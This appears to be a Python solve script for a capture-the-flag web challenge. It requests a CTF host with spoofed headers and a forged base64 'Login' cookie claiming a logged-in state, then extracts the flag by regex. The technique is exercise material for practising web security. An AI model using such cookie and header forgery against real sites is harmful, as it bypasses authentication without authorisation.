import re
import requests

headers = {
    'User-Agent': 'Bikini Bottom',
    'Date': 'Sun, 14 Jul 2024 00:00:00 GMT',
    'Accept-Language': 'fr',
    'Cookie': 'flavor=chocolate_chip; Login=eyJsb2dnZWRpbiI6IHRydWV9; Path=/'
}

response = requests.get('http://holesomebirthdayparty.ctf.umasscybersec.org/', headers=headers)

print(re.search('UMASS\{.+\}', response.text).group(0))